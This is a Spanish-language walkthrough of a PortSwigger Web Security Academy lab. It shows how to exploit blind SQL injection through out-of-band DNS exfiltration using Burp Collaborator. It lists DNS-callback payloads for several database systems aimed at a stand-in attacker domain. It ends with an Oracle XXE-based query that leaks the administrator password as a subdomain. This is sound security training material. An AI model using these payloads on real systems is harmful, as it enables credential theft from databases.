---
layout: default
title: Ejercicio práctico
permalink: /injection_types/blind/oob_type/oob_exercise
nav_order: 1
parent: 4.4 Fuera de banda
grand_parent: 4. Inyecciones ciegas
---

# Ejercicio práctico de inyección fuera de banda

> Ejercicio basado en el laboratorio "Lab: Blind SQL injection with out-of-band data exfiltration" de Web Security Academy (PortSwigger).

## Consigna

Este laboratorio contiene una vulnerabilidad de inyección de SQL ciega. La aplicación usa una cookie de rastreo (*tracking*) para análisis y ejecuta una consulta SQL con el valor de esta cookie. 

Sin embargo, las consultas se ejecutan de forma asincrónica y no tienen ningún efecto en la respuesta de la aplicación. Por lo que, se debe probar extraer la información mediante otro canal.

La base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username` y `password`.

Para resolver el laboratorio, obtener el usuario y contraseña del usuario `administrator` e iniciar sesión con estas credenciales.

## Resolución con Burp Collaborator

Para la resolución de este laboratorio se utilizará el servidor de **Burp Collaborator** el cual está publicado a Internet y puede funcionar como canal para recibir la información. Si bien existen herramientas alternativas gratuitas, el laboratorio está configurado para únicamente comunicarse con dominios asociados a PortSwigger.

La consigna menciona que no es posible observar cambios de comportamiento sobre la aplicación, por lo que todas las pruebas deben apoyarse directamente en el servidor auxiliar externo. Para ello, acceder a la pestaña `Collaborator` (solo disponible para *Burp Suite Professional*).

![Collaborator](/sqli-en-la-practica/assets/oob_ex_1.png)

Al presionar `Copy to clipboard` automáticamente se obtiene un **subdominio único** el cual se puede usar como canal para visualizar las respuestas DNS y HTTP del servidor de *Collaborator*.

Para identificar el DBMS y qué *payload* es válido, es pertinente probar los diferentes métodos mencionados en la [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) y así forzar una consulta DNS:

- **Oracle**: 
	```sql
	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://dominio-atacante.net/">
	 %remote;]>'),'/l') FROM dual
	```
	```sql
	SELECT UTL_INADDR.get_host_address('dominio-atacante.net')
	```
- **Microsoft**:
	```sql
	exec master..xp_dirtree '//dominio-atacante.net'`
	```
- **PostgreSQL**:
	```sql
	COPY (SELECT '') TO program 'nslookup dominio-atacante.net'`
	```
- **MySQL**:
	```sql
	LOAD_FILE('\\\\dominio-atacante.net\a')`  
	```
	```sql
	SELECT ... INTO OUTFILE '\\\\dominio-atacante.net\a'`
	```

Una consulta exitosa generaría una resolución DNS sobre el dominio utilizado, esto sería visualizado de la siguiente manera en la sección `Collaborator`:

![Collaborator 2](/sqli-en-la-practica/assets/oob_ex_2.png)

La exitosa es la de Oracle con XML. Habiendo identificado el DBMS, sumado a los datos facilitados en la consigna, solo resta construir la consulta mediante la cual se extraerá la información. La técnica exitosa aprovecha una entidad externa XML (XXE) para activar una búsqueda de DNS. No está dentro del alcance de esta documentación explicar por qué funciona (se recomienda ver el [módulo XXE de la Web Security Academy](https://portswigger.net/web-security/xxe)). Lo importante es entender la posición de inyección y que la URL del *payload* debe ser reemplazada por la que provee *Burp Collaborator*. Con el siguiente fragmento simplificado de inyección:

```sql
SELECT EXTRACTVALUE(xmltype('<!DOCTYPE root [ <!ENTITY % remote SYSTEM 
	"http://'||(SELECT YOUR-QUERY-HERE)||'.dominio-atacante.net/"> 
	%remote;]>'),'/l') FROM dual
```

**se inserta como subdominio** el resultado de una consulta arbitraria. Por ejemplo, si la consulta fuera `SELECT 'jeje'`, el DBMS intentaría resolver el subdominio `jeje.dominio-atacante.net`. Por lo tanto, para obtener la contraseña del administrador, se inserta `SELECT password FROM users WHERE username='administrator'`. Finalmente, consulta final es:

```sql
SELECT EXTRACTVALUE(xmltype('<!DOCTYPE root [ <!ENTITY % remote SYSTEM 
	"http://'||(SELECT password FROM users WHERE username='administrator')
	||'.dominio-atacante.net/"> %remote;]>'),'/l') FROM dual
```

Suplantar el valor de la cookie con el payload final de inyección resulta en el siguiente pedido HTTP:

![Repeater](/sqli-en-la-practica/assets/oob_ex_3.jpeg)

Notar que se utiliza un dominio de *Burp Collaborator* (`oastify.com`), y que los caracteres `%` y `;` fueron reemplazados por `%25` y `%3b` respectivamente. Estas son sus codificaciones para URL y son necesarias para no generar conflicto con la interpretación/*parsing* de la cookie. Observando la respuesta en el historial de la pestaña `Collaborator`:

![Collaborator 3](/sqli-en-la-practica/assets/oob_ex_4.png)

se aprecia la contraseña de la consulta inyectada como subdominio en la solicitud DNS.
